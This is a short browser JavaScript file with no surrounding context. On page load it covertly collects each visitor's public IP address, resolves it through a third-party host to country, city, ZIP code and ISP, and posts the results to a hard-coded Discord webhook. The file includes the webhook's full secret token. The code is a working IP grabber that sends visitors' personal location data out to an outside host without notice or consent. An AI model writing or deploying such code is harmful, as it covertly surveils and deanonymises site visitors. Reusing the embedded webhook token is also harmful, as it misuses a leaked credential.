async function getIPDetails() {
  // Fetch IP address from ipify
  const ipResponse = await fetch('https://api.ipify.org?format=json');
  const { ip } = await ipResponse.json();
  
  const detailedResponse = await fetch(`https://we-are-jammin.xyz/json/${ip}`);
  const detailed = await detailedResponse.json();
  
  return { ip, detailed };
}

async function sendWebhook(data) {
  const webhookUrl = 'https://discord.com/api/webhooks/1289270629932990526/TTpXp3OTrYs1bxpu_oD9rxPsybEqYXx07BVShmwp8480m-jKMvWY0CykepkQiMQJf3uZ';
  await fetch(webhookUrl, {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify({
          content: `Visitor Info:\nIP: ${data.ip}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nZIP Code: ${data.zip}\nLocation: ${data.location}\nISP: ${data.isp}\nOrganization: ${data.organization}\nAutonomous System: ${data.as}`
      }),
  });
}

window.addEventListener('load', async () => {
  const { ip, detailed } = await getIPDetails();
  await sendWebhook({
      ip,
      country: detailed.country,
      region: detailed.regionName,
      city: detailed.city,
      zip: detailed.zip,
      location: detailed.location,
      isp: detailed.isp,
      organization: detailed.org,
      as: detailed.as
  });
});
